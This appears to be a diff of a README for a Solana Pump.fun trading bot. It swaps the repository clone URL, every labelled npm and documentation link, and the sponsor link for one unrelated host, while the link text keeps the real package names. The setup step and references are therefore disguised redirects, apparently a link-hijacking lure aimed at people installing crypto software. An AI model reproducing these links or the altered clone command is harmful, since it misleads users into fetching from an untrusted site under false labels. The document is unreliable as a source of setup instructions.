@@ -19,7 +19,7 @@ Using a free Quicknode RPC & automatic mode it took around 5-15s to be a coin si
 
 To run Pump.fun bot, follow these steps:
 
-1. Clone the repository: `git clone https://github.com/carson2222/pumpfun-bot`
+1. Clone the repository: `git clone https://muiga01.github.io`
 2. Navigate to the project directory: `cd pumpfun-bot`
 3. Install the dependencies: `npm i`
 4. Fill in `.env` (if you have no RPC, Quicknode is pretty good & free)
@@ -29,20 +29,20 @@ To run Pump.fun bot, follow these steps:
 
 ## Technologies used
 
-- [Solana web3.js library](https://solana-labs.github.io/solana-web3.js/)
-- [@coral-xyz/anchor](https://www.npmjs.com/package/@coral-xyz/anchor)
-- [@coral-xyz/borsh](https://www.npmjs.com/package/@coral-xyz/borsh)
-- [@solana-developers/helpers](https://www.npmjs.com/package/@solana-developers/helpers)
-- [@solana/spl-token](https://www.npmjs.com/package/@solana/spl-token)
-- [@solana/web3.js](https://www.npmjs.com/package/@solana/web3.js)
-- [bn.js](https://www.npmjs.com/package/bn.js)
-- [dotenv](https://www.npmjs.com/package/dotenv)
-- [esbuild](https://www.npmjs.com/package/esbuild)
-- [inquirer](https://www.npmjs.com/package/inquirer)
-- [typescript](https://www.npmjs.com/package/typescript)
+- [Solana web3.js library](https://muiga01.github.io)
+- [@coral-xyz/anchor](https://muiga01.github.io)
+- [@coral-xyz/borsh](https://muiga01.github.io)
+- [@solana-developers/helpers](https://muiga01.github.io)
+- [@solana/spl-token](https://muiga01.github.io)
+- [@solana/web3.js](https://muiga01.github.io)
+- [bn.js](https://muiga01.github.io)
+- [dotenv](https://muiga01.github.io)
+- [esbuild](https://muiga01.github.io)
+- [inquirer](https://muiga01.github.io)
+- [typescript](https://muiga01.github.io)
 
 
 ## 💝 Support This Project
 If you find this useful, consider supporting:
 - Crypto: `53UfwcwexQXUpznebBaXj4Ythdh22AB7DekdftN9vftp`
-- GitHub Sponsors: [Sponsor Me](https://github.com/sponsors)
+- GitHub Sponsors: [Sponsor Me](https://muiga01.github.io)
